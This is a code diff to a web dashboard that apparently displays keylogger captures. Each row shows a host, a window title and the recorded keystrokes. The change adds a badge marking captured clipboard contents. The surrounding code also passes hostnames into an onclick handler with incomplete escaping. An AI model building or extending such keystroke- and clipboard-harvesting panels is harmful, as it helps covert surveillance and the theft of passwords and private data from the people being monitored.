@@ -315,12 +315,15 @@ async function fetchKeys(resetPage) {
       const time = ts ? new Date(ts).toLocaleString() : '-';
       const host = row.hostname || '-';
       const win = row.window_title || '';
+      const isClipboard = win === '[CLIPBOARD]';
       const disp = displayHost(host);
       const rowClass = i % 2 === 0 ? '' : 'bg-slate-900/30';
       html += '<tr class="' + rowClass + 'hover:bg-slate-800/30 transition-colors">'
         + '<td class="py-3.5 px-4 text-slate-400 whitespace-nowrap">' + time + '</td>'
         + '<td class="py-3.5 px-4 text-emerald-400 font-medium cursor-pointer hover:underline" onclick="editAlias(\'' + host.replace(/'/g, "\\'") + '\')" title="Click to rename">' + escapeHtml(disp) + '</td>'
-        + '<td class="py-3.5 px-4 text-slate-300 truncate max-w-xs" title="' + escapeHtml(win) + '">' + escapeHtml(win) + '</td>'
+        + '<td class="py-3.5 px-4 text-slate-300 truncate max-w-xs" title="' + escapeHtml(win) + '">'
+        + (isClipboard ? '<span class="inline-flex items-center px-1.5 py-0.5 text-xs font-medium rounded bg-violet-800/40 text-violet-300 border border-violet-700/40">Clipboard</span>' : escapeHtml(win))
+        + '</td>'
         + '<td class="py-3.5 px-4 text-slate-200 mono-log tracking-wide">' + escapeHtml(keys) + '</td>'
         + '</tr>';
     }
